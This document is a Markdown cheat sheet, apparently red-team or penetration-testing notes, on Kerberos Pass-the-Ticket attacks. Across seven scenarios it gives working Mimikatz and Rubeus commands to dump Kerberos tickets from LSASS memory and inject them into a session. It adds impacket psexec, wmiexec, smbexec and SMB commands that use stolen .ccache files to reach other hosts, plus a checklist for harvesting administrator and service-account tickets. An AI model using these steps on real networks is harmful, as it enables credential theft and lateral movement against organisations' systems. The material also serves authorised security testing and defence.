# Pass-the-Ticket (PTT)

## Objective

Pass-the-Ticket (PTT) is a Kerberos authentication technique where a **valid Kerberos ticket** (TGT or TGS) is injected into a session to authenticate without knowing the user's password or NTLM hash.

Unlike Pass-the-Hash, PTT reuses **legitimate Kerberos tickets** instead of NTLM credentials.

---

# When to Use Pass-the-Ticket

PTT is useful when you have access to a valid Kerberos ticket but do not know the account's password.

Common scenarios include:

- Compromised Windows host with logged-in users.
- Service account running under a domain account.
- WinRM shell on a domain-joined machine.
- RDP session.
- IIS Application Pool running as a domain account.
- SQL Server service account.
- Scheduled Tasks using domain credentials.
- Backup software running under a domain account.
- Tickets exported from Mimikatz or Rubeus.
- `.ccache` files obtained from Linux.
- `.kirbi` files obtained from Windows.

---

# Kerberos Ticket Types

## TGT (Ticket Granting Ticket)

Issued after user authentication.

Used to request service tickets.

Can authenticate to any service the user is authorized for.

---

## TGS (Service Ticket)

Issued for a specific service.

Examples:

- CIFS
- HTTP
- MSSQL
- LDAP
- HOST
- WSMAN

Can only authenticate to the specified service.

---

# Enumerate Existing Tickets

## Windows

```cmd
klist
```

---

## Mimikatz

```text
sekurlsa::tickets
```

---

## Rubeus

```powershell
Rubeus.exe triage
```

---

# Scenario 1 - Logged-in User

A privileged user is logged onto the compromised workstation.

Dump tickets.

## Mimikatz

```text
sekurlsa::tickets /export
```

## Rubeus

```powershell
Rubeus.exe dump
```

Inject the ticket.

```text
kerberos::ptt Administrator.kirbi
```

Verify.

```cmd
klist
```

---

# Scenario 2 - Service Account Ticket

A service such as SQL Server, IIS, Exchange, Backup Software or Scheduled Task runs under a domain account.

Example:

```
svc_sql
svc_backup
svc_web
```

Extract tickets.

```powershell
Rubeus.exe dump
```

or

```text
sekurlsa::tickets /export
```

Inject.

```text
kerberos::ptt svc_sql.kirbi
```

Access the permitted service.

---

# Scenario 3 - WinRM Shell

You compromise a machine using WinRM.

A different user has already authenticated.

Dump tickets.

```text
sekurlsa::tickets
```

Inject desired ticket.

```text
kerberos::ptt administrator.kirbi
```

Verify.

```cmd
klist
```

---

# Scenario 4 - RDP Session

An administrator is logged into the target.

Dump tickets from LSASS.

Inject.

Reuse the Administrator ticket.

---

# Scenario 5 - Kerberoast but Cannot Crack

You recover a Kerberoast hash.

```
svc_mssql
```

The password cannot be cracked.

Later, you compromise another machine where **svc_mssql** is running as a service.

Dump Kerberos tickets.

```powershell
Rubeus.exe dump
```

or

```text
sekurlsa::tickets /export
```

Inject the service ticket.

```text
kerberos::ptt svc_mssql.kirbi
```

Authenticate to resources permitted for **svc_mssql**.

> **Note:** The Kerberoast hash itself is **not** used for authentication. The live Kerberos ticket is extracted from memory and reused.

---

# Scenario 6 - Linux (.ccache)

A Kerberos cache file is recovered.

```
Administrator.ccache
```

Load the cache.

```bash
export KRB5CCNAME=Administrator.ccache
```

Verify.

```bash
klist
```

Use Kerberos authentication.

```bash
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

---

# Scenario 7 - Recovered .kirbi File

A ticket file is discovered during post-exploitation.

Examples:

- Downloads
- Desktop
- Temp directory
- Backup
- Exported by another operator

Inject.

```text
kerberos::ptt ticket.kirbi
```

---

# Export Tickets

## Mimikatz

```text
sekurlsa::tickets /export
```

---

## Rubeus

```powershell
Rubeus.exe dump
```

---

# Inject Tickets

## Mimikatz

```text
kerberos::ptt ticket.kirbi
```

---

## Rubeus

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

# Linux Usage

Load cache.

```bash
export KRB5CCNAME=ticket.ccache
```

Verify.

```bash
klist
```

Examples.

SMB

```bash
impacket-smbclient -k -no-pass //<TARGET>/C$
```

PsExec

```bash
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

WMI

```bash
impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

SMBExec

```bash
impacket-smbexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

MSSQL

```bash
impacket-mssqlclient -k -no-pass <TARGET>
```

LDAP

```bash
ldapsearch -Y GSSAPI ...
```

---

# Verify Ticket

Windows

```cmd
klist
```

Linux

```bash
klist
```

---

# Cleanup

Windows

```cmd
klist purge
```

or

```text
kerberos::purge
```

Linux

```bash
unset KRB5CCNAME
```

---

# Tips

- Always enumerate Kerberos tickets after obtaining a shell.
- Check every logged-in user.
- Service accounts frequently have reusable tickets.
- Scheduled Tasks often leave Kerberos tickets in memory.
- SQL Server and IIS commonly run under privileged domain accounts.
- A Kerberoast hash cannot be used directly for Pass-the-Ticket.
- If Kerberoasting fails because the password cannot be cracked, look for the same service account running elsewhere and extract its live ticket.
- Save every `.kirbi` and `.ccache` file you recover.
- Verify injected tickets with `klist` before attempting authentication.

---

# Checklist

- [ ] Enumerate Kerberos tickets.
- [ ] Identify privileged users.
- [ ] Export TGTs and TGS tickets.
- [ ] Inject recovered tickets.
- [ ] Verify ticket injection.
- [ ] Authenticate using Kerberos.
- [ ] Check service account tickets.
- [ ] Check WinRM and RDP sessions.
- [ ] Check scheduled tasks and service accounts.
- [ ] Save all `.kirbi` and `.ccache` files.
- [ ] Purge tickets after testing.
